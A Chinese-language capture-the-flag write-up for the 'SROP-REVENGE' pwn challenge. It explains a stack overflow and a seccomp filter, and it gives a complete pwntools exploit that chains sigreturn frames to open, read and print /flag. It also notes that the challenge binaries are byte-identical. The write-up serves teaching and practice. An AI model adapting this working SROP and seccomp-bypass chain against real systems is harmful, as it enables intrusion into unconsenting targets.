# SROP-REVENGE

## 题目简述

程序仍通过 `syscall(0, 0, buf, 0x900)` 向 8 字节栈缓冲区读入数据，并提供 `syscall; ret` 及设置 `rax=15` 的 gadget。seccomp 禁止 `execve`、`execveat`，但允许 `open/read/write`，预期解仍是两阶段 SROP。

仓库中的 Revenge 镜像改用 Ubuntu 22.04，而普通版使用 Ubuntu 20.04。不过当前仓库四份 `srop`/`srop-revenge` 的 `build/pwn`、`dist/pwn` 实际 SHA-256 完全相同，均为：

```text
6057fd360b1566ee2768fd9aa1d1ef643e0eec507bd7a11624662a616637d00e
```

因此附件的指令和 gadget 地址没有任何差别；仅更换运行时 libc 不会改变该 ELF 自身的 gadget。原题解中“Revenge 因高版本 libc 几乎没有 gadget”的说法无法由仓库附件支持，不能作为当前文件的事实。

## 解题过程

二进制保护为 Partial RELRO、NX、无 Canary、无 PIE。栈溢出偏移是 16 字节，关键指令为：

```asm
0x401385: syscall
0x401387: ret
0x401388: push 0xf
0x40138a: pop rax
0x40138b: ret
```

地址应从附件动态搜索而不是照抄常量。第一份伪造信号帧执行 `read(0, .bss, 0x1000)` 并迁移 `rsp`；随后三帧依次执行 `open("/flag", 0)`、`read(3, buffer, 0x100)`、`write(1, buffer, 0x100)`。

```python
import time

from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = context.binary = ELF(args.BIN or "./pwn", checksec=False)
if not args.HOST or not args.PORT:
    raise SystemExit("usage: python exp.py BIN=./pwn HOST=<host> PORT=<port>")
io = remote(args.HOST, int(args.PORT))

syscall_ret = ROP(elf).find_gadget(["syscall", "ret"]).address
set_rax_15 = next(elf.search(asm("push 15; pop rax; ret")))
staging = elf.bss() + 0x400

frame_size = len(bytes(SigreturnFrame()))
segment_size = 16 + frame_size
path_address = staging + 3 * segment_size


def invoke_sigreturn(frame):
    return flat(set_rax_15, syscall_ret, bytes(frame))


stage1_frame = SigreturnFrame()
stage1_frame.rax = constants.SYS_read
stage1_frame.rdi = 0
stage1_frame.rsi = staging
stage1_frame.rdx = 0x1000
stage1_frame.rip = syscall_ret
stage1_frame.rsp = staging

open_frame = SigreturnFrame()
open_frame.rax = constants.SYS_open
open_frame.rdi = path_address
open_frame.rsi = 0
open_frame.rdx = 0
open_frame.rip = syscall_ret
open_frame.rsp = staging + segment_size

read_frame = SigreturnFrame()
read_frame.rax = constants.SYS_read
read_frame.rdi = 3
read_frame.rsi = path_address
read_frame.rdx = 0x100
read_frame.rip = syscall_ret
read_frame.rsp = staging + 2 * segment_size

write_frame = SigreturnFrame()
write_frame.rax = constants.SYS_write
write_frame.rdi = 1
write_frame.rsi = path_address
write_frame.rdx = 0x100
write_frame.rip = syscall_ret

stage1 = b"A" * 16 + invoke_sigreturn(stage1_frame)
stage2 = (
    invoke_sigreturn(open_frame)
    + invoke_sigreturn(read_frame)
    + invoke_sigreturn(write_frame)
    + b"/flag\x00"
)

io.send(stage1)
time.sleep(0.1)
io.send(stage2)
io.interactive()
```

`/home/ctf` 被设为 chroot 根目录，所以 Dockerfile 中复制到 `/home/ctf/flag` 的文件在进程内路径正是 `/flag`。

## 方法总结

Revenge 版本的仓库证据只证明基础镜像从 Ubuntu 20.04 变为 22.04，并没有证明 ELF gadget 发生变化；实际附件甚至逐字节相同。稳定解法不依赖 libc gadget，而是利用程序自带的 `rax=15` 与 `syscall; ret` 完成 SROP，再通过 ORW 绕过 seccomp。题解应以当前二进制和容器配置为准，而不是机械沿用历史环境描述。
